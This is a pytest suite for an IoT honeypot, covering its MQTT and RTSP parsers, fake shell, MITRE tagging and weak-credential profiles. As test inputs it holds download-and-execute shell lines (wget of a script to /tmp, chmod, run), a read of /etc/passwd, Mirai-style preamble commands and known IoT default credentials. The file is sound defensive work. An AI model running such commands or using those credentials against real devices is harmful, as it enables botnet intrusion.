"""
HoneyBot-IoT — unit tests for the protocol parsers and fake shell.
These run with NO database or Redis (state falls back to in-memory), so they
are safe for CI.  Run:  pytest -q
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
os.environ.setdefault("REDIS_URL", "redis://127.0.0.1:1/0")   # force in-memory state

import pytest


# ── MQTT variable-length integer (the v0.3 bug: only 1 byte was read) ───────
from mqtt_honeypot.mqtt_honeypot import (encode_remaining_length, decode_remaining_length,
                                         read_str, parse_connect, parse_subscribe, topic_matches,
                                         Malformed)


@pytest.mark.parametrize("n", [0, 1, 127, 128, 200, 16383, 16384, 2097151])
def test_remaining_length_roundtrip(n):
    data = encode_remaining_length(n)
    it = iter(data)
    assert decode_remaining_length(lambda: next(it)) == n


def test_remaining_length_handles_large_packet():
    # 300-byte packet: v0.3 read one byte and mis-parsed; must round-trip now
    assert len(encode_remaining_length(300)) == 2
    it = iter(encode_remaining_length(300))
    assert decode_remaining_length(lambda: next(it)) == 300


def test_mqtt_connect_with_credentials():
    cid, user, pw = b"client1", "admin", "secret"
    payload = (len(cid).to_bytes(2, "big") + cid +
               len(user).to_bytes(2, "big") + user.encode() +
               len(pw).to_bytes(2, "big") + pw.encode())
    vh = b"\x00\x04MQTT\x04\xc2\x00\x3c"      # user+pass flags (0xc2)
    c = parse_connect(vh + payload)
    assert c["username"] == "admin" and c["password"] == "secret" and c["client_id"] == "client1"


def test_mqtt_rejects_bad_protocol():
    with pytest.raises(Malformed):
        parse_connect(b"\x00\x03XXX\x04\x00\x00\x3c")


def test_mqtt_subscribe_multiple_topics():
    data = b"\x00\x01" + b"\x00\x04lock\x00" + b"\x00\x06sensor\x01"
    pid, topics = parse_subscribe(data)
    assert pid == 1 and ("lock", 0) in topics and ("sensor", 1) in topics


@pytest.mark.parametrize("flt,topic,expected", [
    ("#", "sensor/temperature", True), ("sensor/#", "sensor/temperature", True),
    ("sensor/+", "sensor/temperature", True), ("sensor/+", "sensor/a/b", False),
    ("lock/status", "lock/status", True), ("lock/status", "lock/cmd", False),
    ("#", "$SYS/broker/version", False),
])
def test_topic_matching(flt, topic, expected):
    assert topic_matches(flt, topic) is expected


# ── RTSP digest auth ─────────────────────────────────────────────────────────
from rtsp_honeypot.rtsp_honeypot import parse_auth_header, digest_check
import hashlib


def test_rtsp_parse_digest_header():
    h = 'Digest username="admin", realm="r", nonce="abc", uri="rtsp://h/s", response="deadbeef"'
    scheme, _, params = parse_auth_header(h)
    assert scheme == "digest" and params["username"] == "admin" and params["nonce"] == "abc"


def test_rtsp_digest_accepts_valid_default_credentials():
    realm, nonce, uri, method = "IP Camera(21AB9)", "n0", "rtsp://h/cam", "DESCRIBE"
    ha1 = hashlib.md5(f"admin:{realm}:admin".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    resp = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
    params = dict(username="admin", realm=realm, nonce=nonce, uri=uri, response=resp)
    assert digest_check(params, method) == "admin"


def test_rtsp_digest_rejects_wrong_password():
    params = dict(username="admin", realm="IP Camera(21AB9)", nonce="n0",
                  uri="rtsp://h/cam", response="0" * 32)
    assert digest_check(params, "DESCRIBE") is None


# ── fake shell ───────────────────────────────────────────────────────────────
from common.fakeshell import FakeShell


def test_shell_argument_tolerant_commands():
    sh = FakeShell("smartlock")
    assert "ARMv7" in sh.run("cat /proc/cpuinfo")[0]
    assert "root" in sh.run("ls -la /")[0] or "bin" in sh.run("ls -la /")[0]
    # the v0.3 problem: `ls -la` used to give "command not found"
    assert "not found" not in sh.run("ls -la /tmp")[0]


def test_shell_mirai_preamble_is_silent():
    sh = FakeShell("sensor")
    for cmd in ("enable", "system", "shell", "sh"):
        assert "not found" not in sh.run(cmd)[0]


def test_shell_captures_url_without_fetching():
    sh = FakeShell("smartlock")
    out, _ = sh.run("cd /tmp && wget http://198.51.100.9/x.sh")
    assert "x.sh" in out                 # realistic wget output
    # the file now exists in the fake fs but nothing was really downloaded
    assert "x.sh" in sh.run("ls /tmp")[0]


def test_shell_command_chaining_and_pipes():
    sh = FakeShell("smartlock")
    assert sh.run("false || echo fallback")[0] == "fallback"
    assert sh.run("true && echo ok")[0] == "ok"
    assert sh.run("cat /etc/passwd | wc -l")[0].strip().isdigit()


def test_shell_exit():
    sh = FakeShell("sensor")
    _, should_exit = sh.run("exit")
    assert should_exit is True


def test_shell_device_control_changes_state():
    sh = FakeShell("smartlock")
    sh.run("lockctl unlock")
    assert sh.state.field("smartlock", "lock_state") == "unlocked"


# ── MITRE mapping ────────────────────────────────────────────────────────────
from intel import mitre


def test_mitre_known_types_resolve():
    ids, names = mitre.techniques_for("BRUTE_FORCE")
    assert "T1110" in ids and all(n != i for n, i in zip(names, ids))


def test_mitre_command_tagging():
    tags = mitre.tag_command("cd /tmp; wget http://x/y; chmod +x y; ./y")
    assert "T1105" in tags and "T1222.002" in tags


# ── credentials / vulnerability profiles ─────────────────────────────────────
from common.creds import is_weak


def test_weak_credentials_per_device():
    assert is_weak("smartlock", "admin", "admin")
    assert is_weak("sensor", "root", "xc3511")
    assert not is_weak("smartlock", "admin", "a-very-unlikely-password-9271")
